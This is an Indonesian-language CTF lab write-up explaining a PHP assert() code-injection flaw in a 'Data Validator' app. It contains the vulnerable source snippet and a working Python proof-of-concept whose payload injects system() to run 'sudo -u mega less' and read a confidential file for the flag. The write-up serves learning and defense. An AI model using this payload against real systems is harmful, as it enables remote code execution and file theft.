---
title: Rahasia Mega
description: Writeup lab Rahasia Mega
tags:
  - input injection
  - code injection
  - assert
  - CTF
draft: false
---

## Summary
* Vuln Name: `assert()` Injection (Code Injection)
* Type: Input Injection
* Impact: Remote Code Execution (RCE)
* Severity: Critical
* functionality: [[input-validation]], [[code-quality]]

## Metodologi dan Observasi
1. Pada aplikasi `Data Validator` ini, terdapat fitur yang memverifikasi apakah input pengguna mengandung kata "malicious" atau tidak.
2. Saat memeriksa *source code* pada `index.php`, kita dapat melihat cara aplikasi memvalidasi dan melakukan _assertion_ (penegasan) pada masukan tersebut:
   ```php
   $input = isset($_GET['data']) ? $_GET['data'] : '';
   
   if (!empty($input)) {
       $check = "strpos('$input', 'malicious') === false";
       
       if (assert($check)) {
           // ... passed
       }
    }
   ```
3. Pengembang menggabungkan langsung nilai masukan (`$input`) yang didapat dari parameter `data` ke dalam sebuah string PHP (`$check`).
4. Fungsi `assert()` dalam PHP (khususnya versi lebih lawas, ataupun konfigurasi di mana konversi string untuk pernyataan kondisional diperbolehkan) akan mengevaluasi argumen bertipe _string_ sebagai potongan kode PHP—sangat menyerupai cara kerja `eval()`.
5. Oleh sebab itu, dengan memasukkan payload yang sengaja menutup fungsi `strpos` dengan penggabung/penyambung *string* (tanda titik `.`), kita bisa menyisipkan sembarang eksekusi perintah (seperti `system(...)`).
6. Serangan tipe ini dipelajari khusus di bawah kategori [[code-injection]] (*Assertions Code Injection*).

## PoC
Skrip di bawah merakit _payload_ injeksi untuk aplikasi, sekaligus membuktikan eskalasi ke pembacaan _file_ rahasia dari akun `mega`.

```python
import requests
import urllib.parse
import re

url = "http://localhost:1337/"

# Kita merekonstruksi payload terminal lewat sisipan titik (.) pada kalimat assertion
# Payload akhir menjadi: assert("strpos(''.system("...").'', 'malicious') === false")
cmd = "sudo -u mega /usr/bin/less -FX /home/mega/confidential.txt"
payload = f"'.system(\"{cmd}\").'"

# URL Encode data yang akan dikirim via GET
exploit_url = f"{url}?data={urllib.parse.quote(payload)}"

# Eksekusi RCE
res = requests.get(exploit_url)

if "pwn{" in res.text:
    flags = re.findall(r'pwn\{[a-f0-9]+\}', res.text)
    for flag in flags:
        print(f"[+] Flag found: {flag}")
```

## Impact
Karena server menganggap string di dalam fungsi tepercaya (`assert`) dapat dievaluasi secara natif, hal ini berdampak pada penguasaan total atas alur kendali aplikasi ([[remote-code-execution]]). Praktik yang aman mengharuskan *developer* untuk tidak pernah melewatkan _string_ dinamis utuh maupun masukan tidak difilter ke dalam fungsi _debugging_ dan pengujian semacam ini ([[code-quality]]).
